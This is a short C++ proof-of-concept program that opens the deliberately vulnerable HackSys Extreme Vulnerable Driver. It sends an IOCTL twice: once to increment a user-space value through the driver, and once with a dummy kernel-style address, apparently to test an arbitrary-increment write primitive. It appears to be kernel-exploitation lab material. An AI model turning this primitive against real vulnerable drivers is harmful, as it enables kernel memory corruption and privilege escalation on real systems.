#include <iostream>
#include <Windows.h>
#define IOCTL_CODE 0x222073


int main() {
    ULONG64 IncrementValue = 64;
    ULONG64 DummyAddress = 0x1122334455667788;
    PVOID DriverParams1 = &IncrementValue;
    PVOID DriverParams2 = &DummyAddress;
    DWORD BytesReturned = 0;
    HANDLE DriverHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) {
        printf("[-] DriverHandle = INVALID_HANDLE_VALUE\n");
        return FALSE;
    }
    printf("[+] Value before increment: %llu\n", IncrementValue);
    DeviceIoControl(DriverHandle, IOCTL_CODE, &DriverParams1, sizeof(DriverParams1), NULL, NULL, &BytesReturned, NULL);
    printf("[+] Value after increment: %llu\n", IncrementValue);
    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, DriverParams2, sizeof(DriverParams2), NULL, NULL, &BytesReturned, NULL)) {
        printf("[-] Driver operation failed\n");
        CloseHandle(DriverHandle);
        return FALSE;
    }
    printf("[+] Driver operation succeeded\n");
    CloseHandle(DriverHandle);
    return TRUE;
}
